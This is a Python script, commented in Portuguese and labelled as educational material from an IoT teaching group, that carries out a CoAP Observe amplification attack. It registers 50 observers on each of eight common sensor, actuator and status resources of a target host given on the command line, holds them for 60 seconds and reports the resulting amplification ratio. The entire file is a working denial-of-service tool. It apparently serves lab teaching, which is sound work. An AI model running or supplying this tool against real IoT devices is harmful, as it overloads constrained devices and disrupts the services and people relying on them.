#!/usr/bin/env python3
"""
CoAP Observe Amplification Attack
Explora Observe para amplificação de tráfego
Para fins educacionais - GT-IoTEdu
"""

import asyncio
import sys
import time
from aiocoap import *

attack_stats = {
    'observers_registered': 0,
    'notifications_received': 0,
    'errors': 0
}

class ObserveAmplifier:
    def __init__(self, target_host, target_port, resource_paths):
        self.target = f"coap://{target_host}:{target_port}"
        self.resource_paths = resource_paths
        self.observers = []
    
    async def register_observer(self, observer_id, resource_path):
        """Registra um observador em um recurso"""
        try:
            protocol = await Context.create_client_context()
            
            uri = f"{self.target}{resource_path}"
            request = Message(code=GET, uri=uri, observe=0)
            
            print(f"[+] Observer {observer_id:04d} registrando em: {resource_path}")
            
            pr = protocol.request(request)
            
            # Callback para notificações
            async def observation_callback():
                try:
                    async for response in pr.observation:
                        attack_stats['notifications_received'] += 1
                        payload_preview = response.payload[:50] if len(response.payload) > 50 else response.payload
                        print(f"[📡] Observer {observer_id:04d} | Notificação #{attack_stats['notifications_received']}")
                        print(f"    └─> Recurso: {resource_path}")
                        print(f"    └─> Payload: {payload_preview}")
                except Exception as e:
                    attack_stats['errors'] += 1
            
            # Inicia observação
            asyncio.create_task(observation_callback())
            
            # Primeira resposta
            response = await pr.response
            attack_stats['observers_registered'] += 1
            print(f"[✓] Observer {observer_id:04d} registrado com sucesso!")
            
            return pr
            
        except Exception as e:
            attack_stats['errors'] += 1
            print(f"[✗] Erro no observer {observer_id:04d}: {e}")
            return None
    
    async def launch_attack(self, num_observers_per_resource):
        """Lança ataque de amplificação"""
        
        print(f"\n[*] Registrando {num_observers_per_resource} observers por recurso...")
        print(f"[*] Total de recursos: {len(self.resource_paths)}")
        print(f"[*] Total de observers: {num_observers_per_resource * len(self.resource_paths)}\n")
        
        observer_id = 0
        tasks = []
        
        for resource in self.resource_paths:
            for _ in range(num_observers_per_resource):
                task = self.register_observer(observer_id, resource)
                tasks.append(task)
                observer_id += 1
                await asyncio.sleep(0.05)  # Pequeno delay
        
        # Aguarda todos os observers registrarem
        await asyncio.gather(*tasks, return_exceptions=True)
        
        print(f"\n[✓] Fase de registro completa!")
        print(f"[*] Observers registrados: {attack_stats['observers_registered']}")
        print(f"[*] Aguardando notificações automáticas...\n")
        
        # Mantém observers ativos por 60 segundos
        print("[*] Mantendo observers ativos por 60 segundos...")
        for i in range(60):
            await asyncio.sleep(1)
            if i % 10 == 0:
                print(f"[*] {i}s | Notificações recebidas: {attack_stats['notifications_received']}")
        
        print(f"\n[✓] Observe Amplification Attack completado!")
        print(f"[✓] Observers registrados: {attack_stats['observers_registered']}")
        print(f"[✓] Notificações recebidas: {attack_stats['notifications_received']}")
        print(f"[✓] Taxa de amplificação: {attack_stats['notifications_received'] / max(attack_stats['observers_registered'], 1):.2f}x")
        print(f"[✗] Erros: {attack_stats['errors']}")

async def main():
    if len(sys.argv) < 3:
        print("Uso: python3 attack.py <target_ip> <target_port>")
        print("Exemplo: python3 attack.py 172.17.0.2 5683")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print("=" * 70)
    print("  CoAP OBSERVE AMPLIFICATION ATTACK - Educational Purpose Only")
    print("  GT-IoTEdu - Grupo de Trabalho IoT Educacional")
    print("=" * 70)
    print(f"[*] Alvo: {target_host}:{target_port}")
    print(f"[*] Protocolo: CoAP (Constrained Application Protocol)")
    print(f"[*] Técnica: Observe RFC 7641 Amplification")
    print(f"[*] Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    # Recursos CoAP comuns para observar
    resource_paths = [
        "/sensor/temperature",
        "/sensor/humidity",
        "/sensor/pressure",
        "/actuator/led",
        "/actuator/relay",
        "/status",
        "/time",
        "/.well-known/core",
    ]
    
    amplifier = ObserveAmplifier(target_host, target_port, resource_paths)
    
    # 50 observers por recurso = 400 observers totais
    await amplifier.launch_attack(num_observers_per_resource=50)

if __name__ == "__main__":
    asyncio.run(main())